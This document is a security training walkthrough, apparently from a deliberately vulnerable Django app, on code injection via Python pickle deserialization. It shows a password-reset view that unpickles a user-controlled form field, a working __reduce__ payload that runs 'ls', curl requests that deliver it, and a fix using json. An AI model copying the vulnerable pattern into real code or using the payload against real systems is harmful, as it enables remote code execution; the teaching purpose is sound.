**Description**:  Code Injection is an attack type in the application executes untrusted injected code.
These attacks are usually a result of improper input/output data validation.
 In this case we will explore Python's pickle library which "is not secure against erroneous or maliciously constructed data."

**Why**: Typically object serialization is used as a way to quickly compress an object into a byte stream.
This is useful for easily storing objects or even transferring objects efficiently through different parts of a program.

Let's look at the code.

We begin by allowing the functionality to reset a password. A user then gets an "email" which contains a link that takes the user to a password reset form.

**/template/password_reset/reset.html**
```html
 <form id = "resetForm" method="post" action="/password_resets/" > {% csrf_token %}

            <input type="hidden" value={{user}} name="user">

            <div class="form-group">
                <div class="cols-sm-10">
                    <div class="input-group">
                        <span class="input-group-addon"><i class="fa fa-lock fa-lg" aria-hidden="true"></i></span>
                        <input type="password" class="form-control" name="password" id="password"
                               placeholder="New Password" minlength="5" />
                    </div>
                </div>
            </div>
```

Note that our form has a hidden field called user. This user field is in fact a base64 encoded serialized user object created in the confirm_token method

**/views/password_resets/views.py**
```python
@require_http_methods(["GET"])
def confirm_token(request):
    if request.GET.get('token', '') != '' and is_valid_token(
            request.GET['token']):
        messages.success(request, 'Please create a new password.')
        id = request.GET['token'].split('-')[0]
        user = User.objects.filter(user_id=id).first()
        encoded = base64.b64encode(pickle.dumps(user))

        return render(request, 'password_reset/reset.html',
                      context={'user': encoded})
    else:
        try:
            messages.error(request, 'Bad token')
        except:
            pass

        return HttpResponseRedirect(reverse('app:login'))
```

Once submitted the form's data is sent to the reset_password method

**/views/password_resets/views.py**
```python
@require_http_methods(["POST"])
def reset_password(request):
    if request.POST.get('user', '') != '':
        encoded_user = request.POST['user']
        user = pickle.loads(base64.b64decode(encoded_user))

        user.password = request.POST['password']
        user.save()
        messages.success(request, 'Your password has been updated')
    else:
        try:
            messages.error(request, 'Password did not reset')
        except:
            pass

    return redirect('/login')

```

We decode and then pickle unserializes the byte stream into a python object. Well what if we changed the data that pickle recieves?

**The Attack:**

This attach is slightly complicated and requires a decent amount of setup. But it is important to note. We will essentially send a curl request to http://localhost:8000/password_resets/ which has "malicious" data that pickle incidentally executes. Let's begin by constructing this malicious data.

(python shell)
```
>>> import pickle
>>> import base64
>>> import subprocess
>>> class GenProcess(object):
        def __reduce__(self):
            return (subprocess.Popen, (('ls',),))
>>> print base64.b64encode(pickle.dumps(GenProcess()))
Y3N1YnByb2Nlc3MKUG9wZW4KcDAKKChTJ2xzJwpwMQp0cDIKdHAzClJwNAou
```
We just serialized subprocesss method that runs the 'ls' command on our terminal.

Now we'll put together or curl request. It will be in the form

```
curl -H 'Cookie:   csrftoken=<csrf_token>' --data "user=<encoded_object>=&password=password1&confirm_password=password1&csrfmiddlewaretoken=<middleware_token>" http://localhost:8000/password_resets/
```

To get the crsf token fill out the password reset form and get the link. Then make this curl request

```
curl -i localhost:8000/password_resets/?token=2-e1ee0df341f342553a75351cf5e13b31
```
Scrolling to the top you will see the csrf_token. And right next to <form> tag you will see the csrfmiddlewaretoken value. Now for encoded_object parameter put in the output of the python shell. When you send the request you should see the ls command executed!

**The Solution:**

Never use serialization frameworks like pickle or marshal with user input! Prioritize other forms of serialization including json.

